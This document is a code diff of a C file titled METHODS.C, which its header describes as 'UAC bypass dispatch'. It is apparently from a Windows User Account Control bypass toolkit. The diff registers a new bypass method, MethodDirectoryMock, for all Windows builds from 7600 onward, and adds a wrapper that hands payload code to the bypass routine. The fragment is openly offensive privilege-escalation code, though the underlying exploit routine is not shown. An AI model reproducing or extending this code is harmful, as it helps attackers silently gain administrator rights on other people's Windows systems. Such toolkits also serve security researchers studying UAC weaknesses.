@@ -4,9 +4,9 @@
 *
 *  TITLE:       METHODS.C
 *
-*  VERSION:     3.02
+*  VERSION:     3.04
 *
-*  DATE:        01 Oct 2018
+*  DATE:        10 Nov 2018
 *
 *  UAC bypass dispatch.
 *
@@ -64,6 +64,7 @@ UCM_API(MethodSPPLUAObject);
 UCM_API(MethodCreateNewLink);
 UCM_API(MethodDateTimeStateWriter);
 UCM_API(MethodAcCplAdmin);
+UCM_API(MethodDirectoryMock);
 
 UCM_EXTRA_CONTEXT WDCallbackType1;
 
@@ -128,7 +129,8 @@ UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodSPPLUAObject, NULL, { 7600, 17763 }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { MethodCreateNewLink, NULL, { 7600, 14393 }, FUBUKI_ID, FALSE, FALSE, TRUE },
     { MethodDateTimeStateWriter, NULL, { 7600, 17763 }, CHIYODA_ID, FALSE, TRUE, TRUE },
-    { MethodAcCplAdmin, NULL, { 7600, 17134 }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE }
+    { MethodAcCplAdmin, NULL, { 7600, 17134 }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
+    { MethodDirectoryMock, NULL, { 7600, MAXDWORD}, FUBUKI_ID, FALSE, TRUE, TRUE }
 };
 
 #define WDCallbackType1MagicVer 282647531814912
@@ -1036,4 +1038,11 @@ UCM_API(MethodAcCplAdmin)
         lpszPayload = g_ctx.szOptionalParameter;
 
     return ucmAcCplAdminMethod(lpszPayload);
+}
+
+UCM_API(MethodDirectoryMock)
+{
+    return ucmDirectoryMockMethod(
+        Parameter->PayloadCode,
+        Parameter->PayloadSize);
 }
